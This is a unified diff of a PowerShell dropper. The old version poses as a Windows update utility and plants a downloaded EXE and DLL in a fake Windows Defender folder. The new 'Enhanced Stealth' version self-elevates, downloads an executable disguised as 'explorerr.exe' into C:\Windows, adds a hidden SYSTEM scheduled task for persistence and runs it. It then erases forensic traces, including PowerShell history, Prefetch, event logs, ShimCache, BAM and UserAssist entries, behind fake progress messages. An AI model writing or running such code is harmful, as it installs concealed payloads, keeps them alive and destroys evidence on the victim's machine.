@@ -1,226 +1,184 @@
 # Menu Selection
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "  WINDOWS SYSTEM UPDATE UTILITY" -ForegroundColor Yellow
-Write-Host "========================================" -ForegroundColor Cyan
-Write-Host "1. Install System Components" -ForegroundColor Green
-Write-Host "2. Remove System Components" -ForegroundColor Red
-Write-Host "`n========================================" -ForegroundColor Cyan
+Write-Host "+ Utility Runner (Enhanced Stealth)"
+Write-Host "1. Install & Run"
+Write-Host "2. Clean"
 
-$choice = Read-Host "`nEnter choice (1/2)"
+$choice = Read-Host "Enter choice (1/2)"
 
-# Check for Administrator rights
-# --------------------------------------------------------------------
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Write-Host "`n[!] Elevating privileges for system operations..." -ForegroundColor Yellow
+    Write-Host "Restarting with elevated privileges..."
     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File '$PSCommandPath'" -Verb RunAs
     exit
 }
 
-# Define paths and variables
-# --------------------------------------------------------------------
-$InstallPath = "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24050.7-0"
-$SexeDestination = Join-Path $InstallPath "MpCmdRun.exe"
-$DllDestination = Join-Path $InstallPath "MpClient.dll"
-$SexeUrl = "https://github.com/Verte225066/as/blob/main/New%20folder/New%20folder/System.exe"
-$DllUrl = "https://github.com/Verte225066/as/blob/main/New%20folder/gogo.dll"
+$InstallPath = $env:windir
+$SexeDestination = Join-Path $InstallPath "explorerr.exe" 
+$SexeUrl = "https://github.com/Verte225066/test/blob/main/wtf.exe" 
+$TaskName = "\Microsoft\Windows\SystemDataUpdater"
 
-# Install & Run Mode
-# --------------------------------------------------------------------
-if ($choice -eq "1") {
-    Write-Host "`n[+] Installing Windows System Components..." -ForegroundColor Green
-    
-    # สร้างโฟลเดอร์ติดตั้ง
-    if (-not (Test-Path $InstallPath)) {
-        New-Item -Path $InstallPath -Type Directory -Force | Out-Null
-        Write-Host "  [*] Created system directory: $InstallPath" -ForegroundColor Yellow
+function Write-SimulationProgress {
+    param(
+        [string]$Message,
+        [int]$Duration = 3
+    )
+    Write-Host "$Message " -NoNewline -ForegroundColor Cyan
+    for ($i = 0; $i -lt $Duration; $i++) {
+        Write-Host "." -NoNewline -ForegroundColor Green
+        Start-Sleep -Milliseconds 500
     }
-
-    # Download DLL
-    Write-Host "  [*] Downloading MpClient.dll..." -ForegroundColor Yellow
-    try {
-        $webClient = New-Object System.Net.WebClient
-        $webClient.Headers.Add("User-Agent", "Windows-Update-Agent")
-        $webClient.DownloadFile($DllUrl, $DllDestination)
-        
-        # ตรวจสอบว่าไฟล์มีเนื้อหา
-        $dllSize = (Get-Item $DllDestination).Length
-        if ($dllSize -eq 0) {
-            throw "Downloaded file is empty"
-        }
-        Write-Host "  [✓] MpClient.dll download completed. ($dllSize bytes)" -ForegroundColor Green
-    } catch {
-        Write-Host "  [X] MpClient.dll download failed: $_" -ForegroundColor Red
-        Read-Host "`nPress Enter to exit"
-        exit
-    }
-
-    # Download EXE
-    Write-Host "  [*] Downloading MpCmdRun.exe..." -ForegroundColor Yellow
-    try {
-        $webClient = New-Object System.Net.WebClient
-        $webClient.Headers.Add("User-Agent", "Microsoft-Delivery-Optimization")
-        $tempfile = Join-Path $env:TEMP "system_temp.exe"
-        $webClient.DownloadFile($SexeUrl, $tempfile)
-        
-        # ตรวจสอบไฟล์ก่อนย้าย
-        $exeSize = (Get-Item $tempfile).Length
-        if ($exeSize -eq 0) {
-            throw "Downloaded file is empty"
-        }
-        
-        Write-Host "  [✓] File downloaded. ($exeSize bytes)" -ForegroundColor Green
-        
-        # ลองตรวจสอบว่าเป็น EXE ที่ถูกต้องหรือไม่
-        try {
-            # อ่าน 2 bytes แรกเพื่อดูว่าเป็น MZ signature หรือไม่
-            $stream = [System.IO.File]::OpenRead($tempfile)
-            $reader = New-Object System.IO.BinaryReader($stream)
-            $mz = $reader.ReadChars(2) -join ''
-            $reader.Close()
-            $stream.Close()
-            
-            if ($mz -ne 'MZ') {
-                Write-Host "  [!] WARNING: File may not be a valid Windows executable" -ForegroundColor Red
-                Write-Host "      First 2 bytes: $mz (should be MZ)" -ForegroundColor Yellow
-            } else {
-                Write-Host "  [✓] File has valid MZ signature" -ForegroundColor Green
-            }
-        } catch {
-            Write-Host "  [!] Could not verify file signature" -ForegroundColor Yellow
-        }
-        
-        Move-Item -Path $tempfile -Destination $SexeDestination -Force
-        Write-Host "  [✓] MpCmdRun.exe download completed." -ForegroundColor Green
-    } catch {
-        Write-Host "  [X] MpCmdRun.exe download failed: $_" -ForegroundColor Red
-        Read-Host "`nPress Enter to exit"
-        exit
-    }
-
-    # ตั้งค่าแอตทริบิวต์
-    try {
-        Set-ItemProperty -Path $SexeDestination -Name Attributes -Value "Hidden,System,ReadOnly" -Force
-        Set-ItemProperty -Path $DllDestination -Name Attributes -Value "Hidden,System,ReadOnly" -Force
-        Write-Host "  [✓] File attributes configured." -ForegroundColor Green
-    } catch {
-        Write-Host "  [!] Could not set file attributes." -ForegroundColor Yellow
-    }
-
-    # รันโปรแกรม (ลองหลายวิธี)
-    Write-Host "  [*] Attempting to initialize system component..." -ForegroundColor Yellow
-    
-    $success = $false
-    
-    # วิธีที่ 1: ใช้ cmd.exe รัน
-    try {
-        Write-Host "    Method 1: Using cmd.exe..." -ForegroundColor Gray
-        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$SexeDestination`"" -WindowStyle Hidden
-        $success = $true
-        Write-Host "    [✓] Started via cmd.exe" -ForegroundColor Green
-    } catch {
-        Write-Host "    [!] cmd.exe method failed" -ForegroundColor Yellow
-    }
-    
-    # วิธีที่ 2: ใช้ wscript
-    if (-not $success) {
-        try {
-            Write-Host "    Method 2: Using wscript..." -ForegroundColor Gray
-            $vbsContent = "CreateObject(`"WScript.Shell`").Run `"$SexeDestination`", 0, False"
-            $vbsFile = Join-Path $env:TEMP "run.vbs"
-            $vbsContent | Out-File $vbsFile
-            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsFile`"" -WindowStyle Hidden
-            $success = $true
-            Write-Host "    [✓] Started via wscript" -ForegroundColor Green
-        } catch {
-            Write-Host "    [!] wscript method failed" -ForegroundColor Yellow
-        }
-    }
-    
-    # วิธีที่ 3: ใช้ .NET Process
-    if (-not $success) {
-        try {
-            Write-Host "    Method 3: Using .NET Process..." -ForegroundColor Gray
-            [System.Diagnostics.Process]::Start($SexeDestination)
-            $success = $true
-            Write-Host "    [✓] Started via .NET Process" -ForegroundColor Green
-        } catch {
-            Write-Host "    [!] .NET Process method failed" -ForegroundColor Yellow
-        }
-    }
-    
-    if (-not $success) {
-        Write-Host "  [X] All startup methods failed." -ForegroundColor Red
-        Write-Host "  [!] Possible issues:" -ForegroundColor Yellow
-        Write-Host "      - File may be corrupted" -ForegroundColor White
-        Write-Host "      - Not a valid Windows executable" -ForegroundColor White
-        Write-Host "      - Missing dependencies" -ForegroundColor White
-        Write-Host "`n  [!] Manual execution required:" -ForegroundColor Cyan
-        Write-Host "      1. Go to: $InstallPath" -ForegroundColor White
-        Write-Host "      2. Try to run MpCmdRun.exe manually" -ForegroundColor White
-        Write-Host "      3. Check if DLL is in same folder" -ForegroundColor White
-    } else {
-        Write-Host "  [✓] System component initialized successfully." -ForegroundColor Green
-    }
-    
-    Write-Host "`n[✓] Installation process completed!" -ForegroundColor Green
-    Write-Host "    Location: $InstallPath" -ForegroundColor White
-    Write-Host "    To uninstall, run this script again and choose option 2." -ForegroundColor Cyan
-
-# Clean Mode
-# --------------------------------------------------------------------
-} elseif ($choice -eq "2") {
-    Write-Host "`n[-] Removing system components..." -ForegroundColor Red
-
-    Write-Host "  [*] Stopping processes..." -ForegroundColor Yellow
-    try {
-        Get-Process -Name "MpCmdRun" -ErrorAction SilentlyContinue | Stop-Process -Force
-        Write-Host "  [✓] Processes stopped." -ForegroundColor Green
-    } catch {
-        Write-Host "  [!] No processes found." -ForegroundColor Yellow
-    }
-
-    $filesRemoved = 0
-    
-    if (Test-Path $SexeDestination) {
-        try {
-            Remove-Item $SexeDestination -Force
-            Write-Host "  [✓] Removed: MpCmdRun.exe" -ForegroundColor Green
-            $filesRemoved++
-        } catch {
-            Write-Host "  [!] Could not remove MpCmdRun.exe" -ForegroundColor Yellow
-        }
-    }
-
-    if (Test-Path $DllDestination) {
-        try {
-            Remove-Item $DllDestination -Force
-            Write-Host "  [✓] Removed: MpClient.dll" -ForegroundColor Green
-            $filesRemoved++
-        } catch {
-            Write-Host "  [!] Could not remove MpClient.dll" -ForegroundColor Yellow
-        }
-    }
-    
-    if ($filesRemoved -gt 0) {
-        Write-Host "  [*] Cleaning up directory..." -ForegroundColor Yellow
-        Start-Sleep -Seconds 1
-        
-        if (Test-Path $InstallPath) {
-            $items = Get-ChildItem -Path $InstallPath -ErrorAction SilentlyContinue
-            if (-not $items) {
-                try {
-                    Remove-Item $InstallPath -Force
-                    Write-Host "  [✓] Removed empty directory." -ForegroundColor Green
-                } catch {}
-            }
-        }
-    }
-
-    Write-Host "`n[✓] Cleanup completed." -ForegroundColor Green
-
-} else {
-    Write-Host "`n[X] Invalid selection." -ForegroundColor Red
+    Write-Host ""
 }
 
-Write-Host "`n========================================" -ForegroundColor Cyan
-Read-Host "`nPress Enter to exit"
+function Set-Persistence {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$PathToExe
+    )
+    Write-Host "Starting system service registration..." -ForegroundColor Cyan
+    
+    $Action = New-ScheduledTaskAction -Execute $PathToExe
+    $Trigger = New-ScheduledTaskTrigger -AtStartup
+    $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
+    $Settings = New-ScheduledTaskSettingsSet -StartWhenAvailable -Hidden
+
+    Write-SimulationProgress -Message "Processing service request" -Duration 4
+    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Description "Performs critical system data synchronization." -Force | Out-Null
+    
+    Write-Host "Service registration complete." -ForegroundColor Green
+}
+
+function Remove-Persistence {
+    param(
+        [Parameter(Mandatory=$true)]
+        [string]$TaskPath
+    )
+    Write-Host "Removing system service..."
+    if (Get-ScheduledTask -TaskName $TaskPath -ErrorAction SilentlyContinue) {
+        Write-SimulationProgress -Message "Unregistering task" -Duration 4
+        Unregister-ScheduledTask -TaskName $TaskPath -Confirm:$false
+        Write-Host "Task $TaskPath removed." -ForegroundColor Green
+    } else {
+        Write-Host "Task $TaskPath not found." -ForegroundColor Yellow
+    }
+}
+
+function Clear-Traces {
+    Write-Host "Initiating system cleanup routines..." -ForegroundColor Yellow
+    
+    Write-SimulationProgress -Message "Running essential maintenance" -Duration 7
+    
+    try {
+        $PSHistoryPath = (Get-PSReadLineOption).HistorySavePath
+        Remove-Item $PSHistoryPath -Force -ErrorAction SilentlyContinue
+    } catch {}
+
+    try {
+        $AutomaticDestinations = Join-Path $env:APPDATA "Microsoft\Windows\Recent\AutomaticDestinations"
+        $CustomDestinations = Join-Path $env:APPDATA "Microsoft\Windows\Recent\CustomDestinations"
+        Get-ChildItem -Path $AutomaticDestinations -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
+        Get-ChildItem -Path $CustomDestinations -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
+    } catch {}
+
+    try {
+        $PrefetchPath = Join-Path $env:windir "Prefetch"
+        Get-ChildItem -Path $PrefetchPath -Exclude "Layout.ini" -Recurse -Force | Remove-Item -ErrorAction SilentlyContinue
+    } catch {}
+
+    try {
+        $RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
+        Get-ItemProperty -Path $RunKey -ErrorAction SilentlyContinue | Select-Object * -ExcludeProperty PSPath, PSParentPath, PSChildName, PSDrive, PSProvider, (Get-ItemProperty -Path $RunKey).'(default)', MRUList | ForEach-Object {
+            Remove-ItemProperty -Path $RunKey -Name $_.PSProperty.Name -ErrorAction SilentlyContinue
+        }
+    } catch {}
+
+    Write-Host "  -> Clearing system logs..."
+    try {
+        Get-WinEvent -ListLog * -ErrorAction SilentlyContinue | ForEach-Object {
+            Clear-EventLog -LogName $_.LogName -ErrorAction SilentlyContinue
+        }
+    } catch {}
+    
+    Write-Host "  -> Running deep registry cleanup..."
+    try {
+        $ShimKey = "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache"
+        Remove-ItemProperty -Path $ShimKey -Name "AppCompatCache" -ErrorAction SilentlyContinue
+    } catch {}
+
+    try {
+        $BAMKey = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\UserSettings"
+        Remove-Item -Path $BAMKey -Recurse -Force -ErrorAction SilentlyContinue
+        $UserAssistKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist"
+        Remove-Item -Path $UserAssistKey -Recurse -Force -ErrorAction SilentlyContinue
+    } catch {}
+
+    try {
+        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+    } catch {}
+    
+    Write-Host "System maintenance complete." -ForegroundColor Green
+}
+
+if ($choice -eq "1") {
+    Write-Host "`nStarting operations..."
+    
+    Write-Host "Retrieving and preparing executable..."
+    try {
+        Write-SimulationProgress -Message "Downloading file" -Duration 8 
+        $tempfile = Join-Path $env:TEMP "temp_download.exe"
+        Invoke-WebRequest -Uri $SexeUrl -OutFile $tempfile
+
+        Write-Host "Moving file to system location: $SexeDestination" -ForegroundColor Yellow
+        Move-Item -Path $tempfile -Destination $SexeDestination -Force
+        
+        Write-Host "Executable installation complete." -ForegroundColor Green
+    } catch {
+        Write-Host "Installation failed: $_" -ForegroundColor Red
+        exit
+    }
+
+    Set-Persistence -PathToExe $SexeDestination
+
+    Write-Host "Executing core application..."
+    try {
+        Write-SimulationProgress -Message "Executing explorerr.exe" -Duration 3
+        Start-Process -FilePath $SexeDestination
+        Write-Host "Program started." -ForegroundColor Green
+    } catch {
+        Write-Host "Execution failed: $." -ForegroundColor Red
+    }
+    
+    Clear-Traces
+
+    Write-Host "`nInstallation completed successfully." -ForegroundColor Green
+
+} elseif ($choice -eq "2") {
+    Write-Host "Initiating system cleanup..."
+
+    Remove-Persistence -TaskPath $TaskName
+
+    Write-Host "Stopping core application process..."
+    try {
+        Write-SimulationProgress -Message "Forcing process termination" -Duration 5 
+        Stop-Process -Name "explorerr" -Force -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 2 
+        Write-Host "Process stop signal sent." -ForegroundColor Yellow
+    } catch {
+        Write-Host "No running process found or failed to stop." -ForegroundColor Yellow
+    }
+
+    Write-Host "Attempting to remove installed file..."
+    if (Test-Path $SexeDestination) {
+        try {
+            Write-SimulationProgress -Message "Removing file from C:\Windows" -Duration 3
+            Remove-Item $SexeDestination -Force
+            Write-Host "Removed executable: $SexeDestination" -ForegroundColor Green
+        } catch {
+            Write-Host "ERROR: Could not remove file. It may still be locked." -ForegroundColor Red
+        }
+    }
+    
+    Write-Host "Cleanup completed." -ForegroundColor Green
+
+} else {
+    Write-Host "Invalid choice." -ForegroundColor Red
+}
